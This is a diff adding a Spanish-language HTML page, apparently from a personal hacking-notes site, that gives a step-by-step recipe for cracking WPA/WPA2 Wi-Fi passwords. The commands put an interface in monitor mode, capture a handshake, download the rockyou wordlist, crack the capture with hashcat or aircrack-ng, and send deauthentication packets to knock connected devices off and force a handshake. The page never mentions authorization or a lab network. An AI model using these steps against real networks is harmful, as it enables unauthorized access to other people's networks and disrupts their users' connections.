@@ -1,0 +1,82 @@
+<html>
+<head>
+
+<title>Manual de Nmap</title>
+<link rel="stylesheet" type="text/css" href="style.css">
+<script src="javas.js"></script>
+</head>
+<body>
+<nav id="menu">
+	<ul><li><a href="/home/kali/Desktop/Ordenamiento/RepoToti/Web/html1.html">Inicio</a></li>
+	<li><a href="#">Protocolos</a>
+	<ul>
+	<li><a href="/home/kali/Desktop/Ordenamiento/RepoToti/Web/ProtocoloNmap.html">Nmap</a></li>
+	<li><a href="/home/kali/Desktop/Ordenamiento/RepoToti/Web/ProtocoloHackWifi.html">Wifi WPA/WPA2</a></li>
+	<li><a href="#">Python</a></li>
+	<li><a href="#">Cancion 4</a></li>
+	<li><a href="#">Cancion 5</a></li>
+	<li><a href="#">Cancion 6</a></li>
+	</ul>
+	</li>
+	<li><a href="#">Practicas</a>
+	<ul>
+	<li><a href="https://tryhackme.com/login">Try Hack Me</a></li>
+	<li><a href="https://auth.freecodecamp.org/login?state=hKFo2SBEcG9hZ19lWW9QV1VkOFVSd3FzRHhCQi16bTJNTVAwWqFupWxvZ2luo3RpZNkgU3Q0aGRfN2xmZVJhN01iTHNmR3A3amhZWkFNUWE1WFajY2lk2SBhVUR2OWpWcVRmeEJSRTFsNjBOQTVBZjd5VENHRTRjeQ&client=aUDv9jVqTfxBRE1l60NA5Af7yTCGE4cy&protocol=oauth2&response_type=code&redirect_uri=https%3A%2F%2Fapi.freecodecamp.org%2Fauth%2Fauth0%2Fcallback&scope=openid%20profile%20email" target="_blank">Free Code Camp</a></li>
+	<li><a href="#">NH</a></li>
+	<li><a href="#">NH</a></li>
+	<li><a href="#">NH</a></li>
+	<li><a href="#">NH</a></li>
+	</ul>
+	</li>
+	<li><a href="#">Sobre Mi</a>
+	<ul>
+	<li><a href="#">NH</a></li>
+	<li><a href="#">NH</a></li>
+	<li><a href="#">NH</a></li>
+	<li><a href="#">NH</a></li>
+	<li><a href="#">NH</a></li>
+	<li><a href="#">NH</a></li>
+	</ul>
+	</li>
+	<li><a href="#">Contactos</a></li>
+	</ul>
+	</nav>
+
+<center><h1>Protocolo para Hackear Wifi<h1></center>
+<hr>
+<br>
+<center>
+<p>Para Wifi Encriptado con WPA o WPA2</p>
+<h3>Primera Parte</h3>
+<p><b>sudo airmon-ng:</b> Buscar el nombre del monitor, Se encuentra en la columna "Interface".</p>
+<p><b>airmon-ng start wlan0:</b> Empezar a monitorear la red.</p>
+<p><b>iwconfig:</b> Habilitar la interfaz en modo monitor.</p>
+<p><b>airmon-ng check kill:</b> Finaliza los procesos que muestren un mensaje de error.</p>
+<p><b>airodump-ng *Nombre de la interfaz(mon0)*:</b> Buscar los routers cercanos</p>
+<p><b>Anotar la direccion MAC y el numero de canal del router</b></p>
+<p><b>airodump-ng -c CANAL --bssid MAC -w /root/Desktop/ mon0:</b> Monitorear la red seleccionada para ver si se produce un <b>handshake</b></p>
+<p>Salir de "airodump-ng" y luego abrir el escritorio.</p>
+<p><b>mv ./-01.cap nombre.cap:</b>Cambiar de nombre al .cap para trabajar mas facil.</p>
+<p><b>cap2hccapx.bin nombre.cap nombre.hccapx:</b> Convertir el archivo ".cap" al formato ".hccapx".</p>
+<h3>Instalar "Naive.Hashcat"</h3>
+<p><b>Descripcion:</b> Servicio para desifrar la contraseña</p>
+<p><b>sudo git clone https://github.com/brannondorsey/naive-hashcat:</b> Descarga el repositorio.</p>
+<p><b>cd naive-hashcat:</b>Ingresa al Repositorio.</p>
+<p><b>curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</b></p>
+<p><b>HASH_FILE=nombre.hccaps POT_FILE=nombre.pot HASH_TYPE=2500 ./naive-hashcat.sh:</b> Ejecutar "naive-hashcat"</p>
+<p><b>Esperar a que se termine de desifrar la contraseña de la red:</b> En el archivo nombre.pot la palabra que esta despues de ; sera la contraseña.</p>
+<h3>Segunda Parte</h3>
+<h5>Usar aircrack-ng en una pc sin tarjeta grafica</h5>
+<p><b>curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt:</b> Descargar un archivo de diccionario(No se desifra si no esta en la lista de palabras).</p>
+<p><b>aircrack-ng -a2 -b MAC -w rockyou.txt nombre.cap:</b> Aircrack desifra la contraseña, WPA=-a WPA2=-a2.</p>
+<h3>Ataques de desauntetificacion para forzar un Handshake</h3>
+<p><b>airodump-ng -c CANAL --bssid MAC:</b> Monitorear la red para encontrar los dispositivos conectados.</p>
+<p><b>aireplay-ng -0 2 -a MAC1 -c MAC2 mon0:</b> Enviar paquetes de desaunteticacion.</p>
+<p><b>LEER:</b></p>
+<p><b>2:</b> Numero de paquetes a enviar. si lo aumento es mas perceptible.</p>
+<p><b>MAC1:</b> MAC de la izquierda en el monitoreo.</p>
+<p><b>MAC2:</b> MAC de la derecha en el monitoreo.</p>
+<p><b>mon0:</b> Nombre de la interfaz.</p>
+</center>
+</body>
+</html>
